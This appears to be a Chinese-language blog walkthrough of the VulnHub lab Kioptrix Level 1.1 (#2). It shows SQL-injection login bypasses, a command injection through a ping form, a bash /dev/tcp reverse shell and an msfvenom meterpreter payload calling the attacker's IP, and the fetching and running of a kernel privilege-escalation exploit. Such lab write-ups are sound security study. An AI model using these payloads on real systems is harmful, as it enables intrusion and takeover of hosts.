@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="Kioptrix Level 1.1(#2) 参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)  渗透思路信息收集 nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  12345678910111213141516Start">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kioptrix Level 1.1(#2)">
+<meta property="og:url" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1(#2)/index.html">
+<meta property="og:site_name" content="Mad1sun个人博客">
+<meta property="og:description" content="Kioptrix Level 1.1(#2) 参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)  渗透思路信息收集 nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  12345678910111213141516Start">
+<meta property="og:locale">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="article:published_time" content="2024-02-03T09:08:24.026Z">
+<meta property="article:modified_time" content="2024-02-27T13:38:36.131Z">
+<meta property="article:author" content="Mad1sun">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://madifaye.github.io/img/404.jpg">
+
+
+<title >Kioptrix Level 1.1(#2)</title>
+
+<!-- Favicon -->
+
+    <link href='/rainbow.svg?v=2.1.10' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/rainbow.svg?v=2.1.10' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/rainbow.svg?v=2.1.10' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+<link rel="stylesheet" href="https://npm.elemecdn.com/swiper@4.5.1/dist/css/swiper.min.css">
+
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"madifaye.github.io","author":"Mad1sun","root":"/","typed_text":["Mad1sun:)"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"rainbow.svg","icon16":"rainbow.svg","icon32":"rainbow.svg","appleTouchIcon":"rainbow.svg","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","showText":"(/≧▽≦/)咦！又好了！","hideText":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://npm.elemecdn.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":200},"toc":{"post_title":false},"live_time":{"start_time":"","prefix":"博客已萌萌哒运行 undefined 天"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-02-27 21:38:36"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+ 
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/rainbow.svg">
+    
+    
+        <div class="trm-logo-text">
+            Mad1sun<span>Handle</span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    主页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags/" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/img/banner.png">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            Kioptrix Level 1.1(#2)
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2024
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/image/avatar.jpg">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        Mad1sun
+    </h5>
+    
+        <div class="trm-label">
+            I&#39;m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                Residence:
+            </div>
+            <div class="trm-label trm-label-light">
+                Mars
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:xqlmadison@outlook.com" class="trm-btn">
+            联系我
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            02/03
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            17:08
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            Mad1sun
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
+<p>参考 <a target="_blank" rel="noopener" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)</a></p>
+</blockquote>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
+<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
+<li>nmap扫描端口及端口服务</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong>看到了web服务：80端口和443端口</strong></p>
+<ul>
+<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>F12 查看源代码</li>
+</ul>
+<img src="./Kioptrix_Level_1.1(#2)/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;"  loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'/>
+
+<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
+<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
+<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
+<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
+</li>
+<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
+<ul>
+<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
+</ul>
+</li>
+<li><p>成功后看到以下页面：</p>
+</li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
+<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>猜测存在RCE漏洞：Remote Code&#x2F;Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
+<p><strong>证明确实存在RCE</strong></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com)</a></p>
+</blockquote>
+<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
+<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
+</li>
+<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
+</li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
+<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
+<p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<ul>
+<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
+<p>参考 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权</a></p>
+</blockquote>
+<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
+<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure>
+
+<p><em>2&gt;&#x2F;dev&#x2F;null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><strong>发现Linux版本是CentOS 4.5</strong></p>
+<ul>
+<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
+</ul>
+<blockquote>
+<p>关于工具使用：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_.&#x2F;linux-exploit-suggester.sh-CSDN博客</a></p>
+</blockquote>
+<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
+<li><code>searchsploit CentOS 4.5</code></li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
+</ul>
+<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p>&#x3D;&#x3D;<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>&#x3D;&#x3D;</p>
+<ul>
+<li>同时在攻击机上也可以看到靶机的信息</li>
+</ul>
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
+<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
+</li>
+<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
+</li>
+<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
+</li>
+<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
+</li>
+</ul>
+<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Kioptrix_Level_1.1(#2)/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
+<p>优秀总结：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
+<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
+</ul>
+<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
+<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
+</ul>
+<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
+<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
+</li>
+<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
+<ul>
+<li>LinEnum 可以枚举信息</li>
+<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
+</ul>
+<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
+</li>
+<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
+</li>
+</ul>
+<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
+<li>Python建立简单http服务</li>
+<li>在攻击机中开启apache</li>
+</ul>
+<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
+<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
+</ul>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/02/27/hello-world/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="/img/block.jpg">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E7%B1%BBOSCP%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">
+                    类OSCP靶机练习
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/02/27/hello-world/" class="trm-anima-link">
+                    Hello World
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/02/27</li>
+                <li>11:21</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/01/29/Kioptrix_Level_1/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="/img/block.jpg">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E7%B1%BBOSCP%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">
+                    类OSCP靶机练习
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/01/29/Kioptrix_Level_1/" class="trm-anima-link">
+                    Kioptrix Level 1
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/01/29</li>
+                <li>21:20</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-scroll-animation">
+
+    
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1
+            </span>
